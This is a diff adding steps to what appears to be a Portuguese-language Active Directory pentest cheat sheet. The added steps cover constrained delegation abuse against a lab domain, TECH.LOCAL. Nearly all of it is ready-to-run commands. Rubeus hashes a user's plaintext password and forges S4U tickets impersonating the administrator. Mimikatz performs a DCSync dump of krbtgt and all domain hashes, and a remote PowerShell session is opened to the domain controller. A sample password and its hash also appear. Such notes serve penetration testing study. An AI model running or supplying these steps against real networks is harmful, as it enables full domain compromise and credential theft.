@@ -1436,7 +1436,43 @@ $FormatEnumerationLimit=-1
 Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, useraccountcontrol  | fl | Out-String -Width 4096
 Get-DomainUser -TrustedToAuth
 ```
-##### CONSTRAINED DELEGATION (COMPÙTER) - GET THE COMPUTER HASH NTLM
+##### CONSTRAINED DELEGATION (USUARIO) - NO RUBEUS, GERAR O HASH RC4 DA SENHA DO USUARIO: yamcha 
+```
+rubeus.exe hash /password:123qwe..
+```
+1A9D94FDE4F369D53FA5515D1D6BEEE0
+
+##### CONSTRAINED DELEGATION (USUARIO) - NO RUBEUS, SOLICITAR TGS PARA A MAQUINA QUE TEMOS ACESSO PARA OS SERVICOS AUTORIZADOS NO AD: (cifs/TECH-DC01.TECH.LOCAL)
+```
+rubeus.exe s4u /user:yamcha /rc4:1A9D94FDE4F369D53FA5515D1D6BEEE0 /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /ptt
+```
+SOLICITAR TICKET PARA OUTROS SERVIÇOS
+```
+rubeus.exe s4u /user:yamcha /rc4:1A9D94FDE4F369D53FA5515D1D6BEEE0 /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /altservice:cifs,host,ldap /ptt 
+```
+##### CONSTRAINED DELEGATION (USUARIO) - OPÇÕES DE ATAQUE
+- OPÇÃO 1 - FAZER O ATAQUE DCSYNC
+
+OBTER TICKET LDAP:
+```
+rubeus.exe s4u /user:yamcha /rc4:1A9D94FDE4F369D53FA5515D1D6BEEE0 /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /altservice:ldap /ptt 
+```
+ATAQUE DCSYNC:
+```
+.\Mimikatz
+lsadump::dcsync /user:tech\krbtgt
+lsadump::dcsync /domain:TECH.LOCAL /all /csv
+```
+OPÇÃO 2 - ACESSAR REMOTAMENTE VIA PSREMOTE
+OBTER TICKET: host,http,wsman,rpcss
+```
+rubeus.exe s4u /user:yamcha /rc4:1A9D94FDE4F369D53FA5515D1D6BEEE0 /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /altservice:host,http,wsman,rpcss /ptt 
+```
+ACESSAR REMOTAMENTE:
+```
+enter-pssession -computername TECH-DC01.TECH.LOCAL
+```
+
 
 
 
